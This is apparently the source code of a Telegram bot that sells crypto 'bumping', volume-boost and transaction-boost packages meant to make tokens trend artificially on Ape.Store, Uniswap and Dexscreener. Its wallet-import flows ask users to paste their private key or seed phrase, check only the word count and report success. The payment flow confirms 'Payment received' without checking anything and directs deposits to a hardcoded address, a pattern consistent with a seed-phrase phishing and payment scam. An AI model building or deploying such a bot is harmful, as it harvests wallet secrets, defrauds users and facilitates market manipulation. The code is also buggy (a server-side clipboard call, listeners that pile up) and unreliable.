const express = require('express');
const app = express();
const TelegramBot = require('node-telegram-bot-api');
const clipboardy = require('clipboardy');
require('dotenv').config();

// Middleware to parse JSON bodies
app.use(express.json());

// Create a bot instance using webhook instead of polling
const bot = new TelegramBot(process.env.TELEGRAM_API_TOKEN, {
  webHook: true
});

// Set the webhook with the correct URL
const url = process.env.RENDER_EXTERNAL_URL || "your-url-here";
const port = process.env.PORT || 3000;
bot.setWebHook(`${url}/bot${process.env.TELEGRAM_API_TOKEN}`);

// Webhook endpoint
app.post(`/bot${process.env.TELEGRAM_API_TOKEN}`, (req, res) => {
  try {
    if (req.body.message) {
      bot.processUpdate(req.body);
    }
  } catch (error) {
    console.error("Error processing message:", error);
  }
  res.sendStatus(200);
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});

// Core functionality for Start Bumping, Buy Volume Boost, and Buy Transaction Boost flows
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, `🤖 Welcome to Base Micro Buy & Volume Booster 🤖\n\nTo get started, please choose the service and configure your settings.\n\nServices:\n- Bumping: To get on the front page of Ape.Store\n- Volume Booster: Create a volume on Ape.Store or Uniswap\n- Transaction Booster: Create thousands of transactions to get top trends on Dexscreener\n\nCompatible Pools:\n- Ape.Store\n- Uniswap\n\nYour Bump Wallet:`, {
    reply_markup: {
      keyboard: [
        [{ text: "🚀 Start Bumping" }, { text: "📈 Buy Volume Boost" }],
        [{ text: "📊 Buy Transaction Boost" }, { text: "👥 Referral Program" }],
        [{ text: "❓HELP" }]
      ],
      resize_keyboard: true,
      one_time_keyboard: true
    }
  });
});

// Flow for Start Bumping
bot.on('message', (msg) => {
  const chatId = msg.chat.id;

  // Handle Start Bumping flow
  if (msg.text === '🚀 Start Bumping') {
    bot.sendMessage(chatId, "Great! Let's get started. What's the name of your project?");
    bot.once('message', (msg) => {
      const projectName = msg.text;
      bot.sendMessage(chatId, `You entered project name: ${projectName}. Now, select the blockchain for your project:`, {
        reply_markup: {
          keyboard: [
            [{ text: "ETH" }, { text: "SOL" }, { text: "TON" }, { text: "SUI" }, { text: "BASE" }],
            [{ text: "Back" }, { text: "Main Menu" }]
          ],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });

      bot.once('message', (msg) => {
        const blockchain = msg.text;
        bot.sendMessage(chatId, `You selected ${blockchain}. Please enter your project token address:`);
        
        bot.once('message', (msg) => {
          const tokenAddress = msg.text;
          bot.sendMessage(chatId, `Enter the amount of coin per bump (in ${blockchain} equivalent):`);

          bot.once('message', (msg) => {
            const coinAmount = msg.text;
            bot.sendMessage(chatId, `Select bump frequency (in seconds) or type 'random':`);
            
            bot.once('message', (msg) => {
              const frequency = msg.text;
              bot.sendMessage(chatId, `Enter slippage percentage (1-100%):`);

              bot.once('message', (msg) => {
                const slippage = msg.text;

                // Offer deposit or wallet import
                bot.sendMessage(chatId, `You can deposit into a single mother wallet that disperses funds automatically, or import your own wallet.`, {
                  reply_markup: {
                    keyboard: [
                      [{ text: "Deposit" }, { text: "Import Wallet" }],
                      [{ text: "Back" }, { text: "Main Menu" }]
                    ],
                    resize_keyboard: true,
                    one_time_keyboard: true
                  }
                });

                bot.on('message', (msg) => {
                  if (msg.text === 'Deposit') {
                    // Generate and show bump wallet
                    const bumpWallet = '0x8a788f8f5DB2Ab7f4553964af8CFC55F671330F6';  // Example wallet
                    clipboardy.writeSync(bumpWallet);  // Copy wallet to clipboard (server-side)
                    bot.sendMessage(chatId, `Generating Bump Wallet...\n\nMinimum Deposit: 0.03 ETH\n\nYour Wallet: ${bumpWallet} (Tap to Copy)\nWallet address copied to your clipboard.`, {
                      reply_markup: {
                        keyboard: [
                          [{ text: "Back" }, { text: "Main Menu" }]
                        ],
                        resize_keyboard: true
                      }
                    });

                    // Proceed to transaction hash and screenshot request
                    bot.once('message', () => {
                      bot.sendMessage(chatId, `Please send the transaction hash and a screenshot of your payment:`);
                      bot.once('message', () => {
                        // After receiving hash and screenshot, proceed to referral or help
                        bot.sendMessage(chatId, `Payment received. Would you like to join the referral program or get help?`, {
                          reply_markup: {
                            keyboard: [
                              [{ text: "👥 Referral Program" }, { text: "❓HELP" }],
                              [{ text: "Main Menu" }]
                            ],
                            resize_keyboard: true
                          }
                        });
                      });
                    });
                  } else if (msg.text === 'Import Wallet') {
                    // Handle private key / seed phrase input
                    bot.sendMessage(chatId, "Paste the private key (12 or 24 word seed phrase) to import:");
                    bot.once('message', (msg) => {
                      const privateKey = msg.text;
                      const isValid = validateSeedPhrase(privateKey);  // Function to validate seed phrase
                      if (isValid) {
                        bot.sendMessage(chatId, "Wallet successfully imported.");
                      } else {
                        bot.sendMessage(chatId, "Invalid private key provided. Try again with the correct format.");
                      }
                    });
                  }
                });
              });
            });
          });
        });
      });
    });
  }

  // Buy Volume Boost flow
  if (msg.text === '📈 Buy Volume Boost') {
    bot.sendMessage(chatId, `Choose your volume boost package. Please refer to the prices:\n\n- Iron Package: $150, 11,600 vol\n- Bronze Package: $300, 23,200 vol\n- Silver Package: $900, 69,000 vol\n- Gold Package: $1,800, 138,000 vol\n- Diamond Package: $3,600, 276,000 vol`, {
      reply_markup: {
        keyboard: [
          [{ text: "Iron Package" }, { text: "Bronze Package" }],
          [{ text: "Silver Package" }, { text: "Gold Package" }, { text: "Diamond Package" }],
          [{ text: "Back" }, { text: "Main Menu" }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
      }
    });

    bot.once('message', (msg) => {
      const packageName = msg.text;
      bot.sendMessage(chatId, `You selected the ${packageName}. Now enter your contract address:`);
      
      bot.once('message', (msg) => {
        const contractAddress = msg.text;
        bot.sendMessage(chatId, `You entered ${contractAddress}. Choose how you will pay:`, {
          reply_markup: {
            keyboard: [
              [{ text: "Deposit" }, { text: "Import Wallet" }],
              [{ text: "Back" }, { text: "Main Menu" }]
            ],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        });
        
        // Deposit or Import Wallet handling
        bot.on('message', (msg) => {
          if (msg.text === 'Deposit') {
            const volumeWallet = '0x123456789VolumeWallet';  // Example wallet
            clipboardy.writeSync(volumeWallet);
            bot.sendMessage(chatId, `Deposit to wallet: ${volumeWallet} (Tap to Copy)\nMinimum: $150`, {
              reply_markup: {
                keyboard: [
                  [{ text: "Back" }, { text: "Main Menu" }]
                ],
                resize_keyboard: true
              }
            });
            bot.once('message', () => {
              bot.sendMessage(chatId, "Please send transaction hash and screenshot.");
            });
          } else if (msg.text === 'Import Wallet') {
            bot.sendMessage(chatId, "Paste the 12 or 24-word seed phrase:");
          }
        });
      });
    });
  }

  // Buy Transaction Boost flow
  if (msg.text === '📊 Buy Transaction Boost') {
    bot.sendMessage(chatId, `Choose your transaction boost package:\n\n- Iron: $200, 3200 transactions\n- Bronze: $400, 6400 transactions\n- Silver: $1200, 19,200 transactions\n- Gold: $2400, 38,400 transactions\n- Diamond: $4800, 76,800 transactions`, {
      reply_markup: {
        keyboard: [
          [{ text: "Iron" }, { text: "Bronze" }],
          [{ text: "Silver" }, { text: "Gold" }, { text: "Diamond" }],
          [{ text: "Back" }, { text: "Main Menu" }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
      }
    });

    bot.once('message', (msg) => {
      const packageName = msg.text;
      bot.sendMessage(chatId, `You selected the ${packageName} package. Now enter your contract address:`);
      
      bot.once('message', (msg) => {
        const contractAddress = msg.text;
        bot.sendMessage(chatId, `You entered ${contractAddress}. Choose how you will pay:`, {
          reply_markup: {
            keyboard: [
              [{ text: "Deposit" }, { text: "Import Wallet" }],
              [{ text: "Back" }, { text: "Main Menu" }]
            ],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        });

        // Deposit or Import Wallet handling
        bot.on('message', (msg) => {
          if (msg.text === 'Deposit') {
            const transactionWallet = '0x123456789TransactionWallet';  // Example wallet
            clipboardy.writeSync(transactionWallet);
            bot.sendMessage(chatId, `Deposit to wallet: ${transactionWallet} (Tap to Copy)\nMinimum: $200`, {
              reply_markup: {
                keyboard: [
                  [{ text: "Back" }, { text: "Main Menu" }]
                ],
                resize_keyboard: true
              }
            });
            bot.once('message', () => {
              bot.sendMessage(chatId, "Please send transaction hash and screenshot.");
            });
          } else if (msg.text === 'Import Wallet') {
            bot.sendMessage(chatId, "Paste the 12 or 24-word seed phrase:");
          }
        });
      });
    });
  }
});

// Utility function to validate a seed phrase (12 or 24 words)
function validateSeedPhrase(seedPhrase) {
  const words = seedPhrase.trim().split(/\s+/);
  return words.length === 12 || words.length === 24;
}